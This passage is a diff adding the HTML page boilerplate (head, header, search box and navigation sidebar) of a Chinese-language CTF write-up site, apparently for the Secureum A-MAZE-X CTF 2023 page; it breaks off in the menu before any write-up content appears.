@@ -1,0 +1,4538 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="YanhuiJessica">
+      
+      
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/defi_security_summit/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-8.3.3">
+    
+    
+      
+        <title>Secureum：A-MAZE-X CTF 2023 - Chictf-Writeups</title>
+      
+    
+    
+  
+      <link rel="stylesheet" href="../../assets/stylesheets/main.4a0965b7.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+      
+    
+<style>
+  .md-typeset h1 {
+    color:var(--md-default-fg-color--light);
+    font-size:2em;
+    line-height:1.3;
+    margin:0 0 1em;
+  }
+</style>
+
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-operation-magic-redemption" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Chictf-Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Secureum：A-MAZE-X CTF 2023
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        简介
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../misc/unpleasant_music/" class="md-tabs__link">
+        Misc
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../web/t_star_upload_bypass/" class="md-tabs__link">
+        Web
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../reverse/easyre/" class="md-tabs__link">
+        Reverse
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../pwn/when_did_you_born/" class="md-tabs__link">
+        Pwn
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../crypto/bank/" class="md-tabs__link">
+        Crypto
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../blockchain/code_is_law/" class="md-tabs__link">
+        Blockchain
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../natas/" class="md-tabs__link md-tabs__link--active">
+        Wargames
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../eggs/ctfhub_index/" class="md-tabs__link">
+        彩蛋
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    Chictf-Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          简介
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="简介" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          简介
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../how_to_participate/" class="md-nav__link">
+        如何参与
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Misc
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Misc" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Misc
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/unpleasant_music/" class="md-nav__link">
+        Unpleasant music
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/leaf_cover_eyes/" class="md-nav__link">
+        一叶障目
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/difficult_programming_language/" class="md-nav__link">
+        Difficult Programming Language
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/secret_information/" class="md-nav__link">
+        机密信息
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/hide_and_seek/" class="md-nav__link">
+        藏藏藏
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/targz_y1ng/" class="md-nav__link">
+        TARGZ-y1ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/gakki/" class="md-nav__link">
+        gakki
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_8">
+          HackerGame 2020
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_8">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2020
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/account_bot/" class="md-nav__link">
+        从零开始的记账工具人
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/gibberish_message/" class="md-nav__link">
+        从零开始的火星文生活
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/self_repeating_repeater/" class="md-nav__link">
+        自复读的复读机
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/233_string_tool/" class="md-nav__link">
+        233 同学的字符串工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/233_docker/" class="md-nav__link">
+        233 同学的 Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/4f_system_middle/" class="md-nav__link">
+        来自一教的图片
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/basic_math_simulator/" class="md-nav__link">
+        超基础的数理模拟器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/stegano50/" class="md-nav__link">
+        Stegano50
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/newsctf_all_reverse/" class="md-nav__link">
+        NEWSCTF - ！了反都，了反
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/audio_frequency_stego/" class="md-nav__link">
+        audio-frequency-stego
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_12">
+          DeconstruCT.F 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_12">
+          <span class="md-nav__icon md-icon"></span>
+          DeconstruCT.F 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/pirates/" class="md-nav__link">
+        Pirates
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/teg_rads/" class="md-nav__link">
+        Teg Rads
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/hearing_not_believing/" class="md-nav__link">
+        HearingNotBelieving
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_14">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_14">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/transparent_file/" class="md-nav__link">
+        透明的文件
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/encrypted_u_disk/" class="md-nav__link">
+        加密的 U 盘
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/p_q/" class="md-nav__link">
+        p😭q
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_15">
+          西湖论剑 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="西湖论剑 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_15">
+          <span class="md-nav__icon md-icon"></span>
+          西湖论剑 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/yusa_little_secret/" class="md-nav__link">
+        YUSA的小秘密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/yusa_secret/" class="md-nav__link">
+        Yusa的秘密
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/compress_the_flag/" class="md-nav__link">
+        Compress The Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/s_script_gi/" class="md-nav__link">
+        s/&lt;script&gt;//gi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/log4_sanity_check/" class="md-nav__link">
+        Log 4 sanity check
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/bishop_duel/" class="md-nav__link">
+        Bishop Duel
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/lighthouse/" class="md-nav__link">
+        Lighthouse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/last_digit/" class="md-nav__link">
+        last digit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_22" type="checkbox" id="__nav_2_22" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_22">
+          HeroCTF 2023
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HeroCTF 2023" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_22">
+          <span class="md-nav__icon md-icon"></span>
+          HeroCTF 2023
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/chm0d/" class="md-nav__link">
+        Chm0d
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../misc/sudoklu/" class="md-nav__link">
+        SUDOkLu
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/t_star_upload_bypass/" class="md-nav__link">
+        文件上传 JS 绕过
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/t_star_tomcat/" class="md-nav__link">
+        小猫咪踩灯泡
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ctfhub_reflected_xss/" class="md-nav__link">
+        CTFHub - 反射型 XSS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/initiative/" class="md-nav__link">
+        主动
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/funhash/" class="md-nav__link">
+        Funhash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/xss_game/" class="md-nav__link">
+        XSS Game
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/web_php_include/" class="md-nav__link">
+        Web php include
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ctfhub_git_leakage/" class="md-nav__link">
+        CTFHub - Git 泄露
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/newsctf_easy_web/" class="md-nav__link">
+        NEWSCTF - easy_web
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/heres_a_flag/" class="md-nav__link">
+        Here's a Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_11">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_11">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/sale_melon/" class="md-nav__link">
+        卖瓜
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/flag_red_packet/" class="md-nav__link">
+        FLAG 助力大红包
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/info_above_graph/" class="md-nav__link">
+        图之上的信息
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/most_secure_crypto_algo/" class="md-nav__link">
+        Most Secure Crypto Algo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/calculus_calc_exercise/" class="md-nav__link">
+        微积分计算小练习
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Reverse
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Reverse
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reverse/easyre/" class="md-nav__link">
+        EasyRe
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reverse/z3/" class="md-nav__link">
+        z3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reverse/newsctf_re_signin/" class="md-nav__link">
+        NEWSCTF - re_signin
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Pwn
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Pwn
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pwn/when_did_you_born/" class="md-nav__link">
+        when did you born
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pwn/amnesia/" class="md-nav__link">
+        Amnesia
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Crypto
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Crypto
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
